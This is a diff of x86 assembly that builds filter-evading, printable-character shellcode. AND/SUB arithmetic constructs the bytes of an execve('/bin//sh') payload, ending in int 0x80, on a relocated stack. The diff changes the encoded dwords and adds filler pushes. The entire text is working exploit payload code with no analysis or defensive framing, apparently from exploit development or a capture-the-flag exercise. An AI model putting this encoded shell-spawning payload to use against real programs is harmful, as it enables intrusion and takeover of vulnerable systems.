@@ -13,65 +13,11 @@ global _start
 		push esp
 		pop eax
 		; add eax, 828 <==> sub eax, (2**32 - 828)
-		sub eax, 55555569H
-		sub eax, 55555669H
-		sub eax, 5655576aH
+		sub eax, 55555442H
+		sub eax, 55555442H
+		sub eax, 55555442H
 		push eax
 		pop esp
-		;========================
-		;  set eax = 5899cd80
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 3822652bH
-		sub eax, 3822662bH
-		sub eax, 3721672aH
-		push eax
-		;========================
-		;  set eax = 89e36a0b
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 275e3252H
-		sub eax, 275e3252H
-		sub eax, 27603151H
-		push eax
-		;========================
-		;  set eax = 2f62696e
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 46353231H
-		sub eax, 45343231H
-		sub eax, 45343230H
-		push eax
-		;========================
-		;  set eax = 2f736868
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 462f3333H
-		sub eax, 452f3233H
-		sub eax, 452e3232H
-		push eax
-		;========================
-		;  set eax = c951682f
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 673a3346H
-		sub eax, 673a3246H
-		sub eax, 683a3245H
-		push eax
-		;========================
-		;  set eax = 90909031
-		;========================
-		and eax, 49494949H
-		and eax, 30303030H
-		sub eax, 25252545H
-		sub eax, 25252545H
-		sub eax, 25252545H
-		push eax
 		;========================
 		;  set eax = 90909090
 		;========================
@@ -80,6 +26,82 @@ global _start
 		sub eax, 25252526H
 		sub eax, 25252525H
 		sub eax, 25252525H
+		push eax
+		;========================
+		;  set eax = 90909080
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 2525252bH
+		sub eax, 2525252bH
+		sub eax, 2525252aH
+		push eax
+		;========================
+		;  set eax = cd99580b
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 65223852H
+		sub eax, 66223852H
+		sub eax, 67223751H
+		push eax
+		;========================
+		;  set eax = 6ae3896e
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 325e2831H
+		sub eax, 315e2731H
+		sub eax, 31602730H
+		push eax
+		;========================
+		;  set eax = 69622f68
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 32354633H
+		sub eax, 32344533H
+		sub eax, 32344532H
+		push eax
+		;========================
+		;  set eax = 68732f2f
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 332f4646H
+		sub eax, 322f4546H
+		sub eax, 322e4545H
+		push eax
+		;========================
+		;  set eax = 6851c931
+		;========================
+		and eax, 49494949H
+		and eax, 30303030H
+		sub eax, 333a6745H
+		sub eax, 323a6745H
+		sub eax, 32396845H
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
+		push eax
 		push eax
 		push eax
 		push eax
